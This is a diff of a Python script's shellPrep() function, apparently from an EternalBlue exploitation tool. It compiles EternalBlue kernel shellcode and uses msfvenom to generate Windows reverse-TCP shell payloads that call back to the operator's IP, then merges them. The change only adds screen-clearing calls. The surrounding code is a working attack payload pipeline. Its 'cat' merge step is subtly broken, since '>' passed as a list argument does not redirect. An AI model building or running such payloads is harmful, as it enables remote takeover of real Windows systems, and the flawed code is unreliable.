@@ -138,18 +138,23 @@ def shellPrep():
 
 	#print("Compiling x64 kernel shellcode...")
 	sp.run(["nasm", "-f", "bin", "shellcode/eternalblue_kshellcode_x64.asm", "-o", "shellcode/sc_x64_kernel.bin"])
+	clearAndTitle()
 	#print("Compiling x86 kernel shellcode...")
 	sp.run(["nasm", "-f", "bin", "shellcode/eternalblue_kshellcode_x86.asm", "-o", "shellcode/sc_x86_kernel.bin"])
+	clearAndTitle()
 
 	#print("Generating x64 cmd shell...")
 	sp.run(["msfvenom", "-p", "windows/x64/shell_reverse_tcp", "-f", "raw", "-o", "shellcode/sc_x64_msf.bin", "EXITFUNC=thread", myIp, portx64])
+	clearAndTitle()
 	#print("Generating x86 cmd shell...")
 	sp.run(["msfvenom", "-p", "windows/shell_reverse_tcp", "-f", "raw", "-o", "shellcode/sc_x86_msf.bin", "EXITFUNC=thread", myIp, portx86])
+	clearAndTitle()
 
 	#print("Merging shellcode...")
 	sp.run(["cat", "shellcode/sc_x64_kernel.bin", "shellcode/sc_x64_msf.bin", ">", "shellcode/sc_x64.bin"])
 	sp.run(["cat", "shellcode/sc_x86_kernel.bin", "shellcode/sc_x86_msf.bin", ">", "shellcode/sc_x86.bin"])
 	sp.run(["python3", "shellcode/eternalblue_sc_merge.py", "shellcode/sc_x86.bin", "shellcode/sc_x64.bin", "shellcode/sc_all.bin"])
+	clearAndTitle()
 
 
 #                                                                              #
